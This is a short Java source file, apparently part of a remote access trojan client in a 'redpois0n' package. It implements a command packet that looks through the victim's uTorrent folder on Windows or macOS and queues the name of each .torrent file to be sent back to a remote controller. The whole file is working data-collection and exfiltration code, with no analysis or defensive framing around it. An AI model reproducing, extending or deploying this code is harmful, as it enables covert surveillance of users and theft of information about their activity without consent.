package com.redpois0n.packets;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;

public class PacketGETUT extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {

		File f = null;
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			f = new File(System.getenv("APPDATA") + "\\uTorrent\\");
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			f = new File(System.getProperty("user.home") + "/Library/Application Support/uTorrent/");
		}
		if (f != null && f.exists()) {
			File[] files = f.listFiles();
			for (File file : files) {
				if (file.getName().toLowerCase().endsWith(".torrent")) {
					Connection.addToSendQueue(new PacketBuilder(Header.UTORRENT, file.getName()));
				}
			}
		}
	}

}
